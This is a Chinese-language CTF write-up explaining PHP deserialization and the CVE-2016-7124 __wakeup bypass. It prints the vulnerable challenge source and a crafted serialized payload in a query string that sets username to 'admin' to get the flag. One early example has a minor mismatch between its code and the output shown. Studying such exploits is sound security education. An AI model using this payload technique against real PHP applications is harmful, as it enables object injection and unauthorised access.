PHP反序列化

### 几个前置知识：

1、序列化数据显示：

public属性序列化的时候格式是正常的

private属性序列化的时候格式是`%00类名%00成员名`

protected属性序列化的时候格式是`%00*%00成员名`

例如这样的：

```php
class Name{
    public $username = 'admin';
    public $password = '100';
}

$pop = new Name;
echo serialize($pop);
?>
// private： 如果输出的没有%00 自己需要补充一下
// O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}

// public:
// O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";s:3:"100";}
```

2、

**漏洞编号**: CVE-2016-7124

**影响版本**: PHP 5 < 5.6.25; PHP 7 < 7.0.10

**漏洞危害**

当一个对象被序列化后，如果该对象的类定义中存在`__wakeup`方法，在调用`unserialize()`函数反序列化该对象时，会先执行`__wakeup`方法。这是为了在对象恢复到内存中时能够进行一些初始化操作。

然而，这个漏洞指出，**如果序列化字符串中表示对象属性个数的值大于实际存在的属性个数，那么`__wakeup`方法将不会被执行**。这意味着攻击者可以通过构造特殊的序列化字符串来绕过`__wakeup`方法的执行，从而可能引发安全问题。

### 题目：

www.zip泄漏源码

class.php:

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

index.php:

```php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

`__wakeup()`是在调用unserialize()时触发，会把username置为guest，导致无法输出flag，要想绕过`__wakeup()`，需要序列化字符串中表示对象属性个数的值大于实际存在的属性个数

构造：

```php
class Name{
    private $username = 'admin';
    private $password = '100';
}
$pop = new Name;
echo serialize($pop);
?>
// O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";}
    //把空格换成%00
    // O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
    // 然后把2换成3
    // O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

```
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

